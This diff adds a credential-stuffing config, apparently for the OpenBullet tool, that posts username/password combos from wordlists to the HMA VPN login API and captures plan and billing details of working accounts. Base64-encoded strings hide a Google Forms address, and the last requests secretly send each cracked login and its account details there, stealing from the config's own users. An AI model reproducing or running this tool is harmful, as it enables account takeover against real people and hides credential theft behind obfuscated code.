@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "HMA @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:19:44.6082285+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTYzZwdF81cW1ENW5ndzIyLW50QnJ3ckpsZ3dmLVFJdlVUdFE5S3ZWR0NNUUlBcWN3L3ZpZXdmb3Jt" -> VAR "LRU1" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "user\":\"" "\"" -> CAP "Username" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTYzZwdF81cW1ENW5ndzIyLW50QnJ3ckpsZ3dmLVFJdlVUdFE5S3ZWR0NNUUlBcWN3L2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuOTgxMjA5MTQzPUhpZGVteUFzcyZlbnRyeS4xNDM1NjM4Njc3PTxVU0VSPjo8UEFTUz4mZW50cnkuMTcyMzI1OTMxOD18UGxhbjo8UGxhbj58TmV4dCBCaWxsaW5nOjxOZXh0IEJpbGxpbmc+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyNDc0Mzc2MTU3OTI3MjEyMTk1NyUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9NDc0Mzc2MTU3OTI3MjEyMTk1Nw==" -> VAR "LRU3" 
+
+#Paket PARSE "<SOURCE>" LR "plan\":\"" "\"" -> CAP "Plan" 
+
+#Next_Billing PARSE "<SOURCE>" LR "\"expires\":\"" "T" -> CAP "Next Billing" "" " Visit us @CrackingLegend.pw" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Billing REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
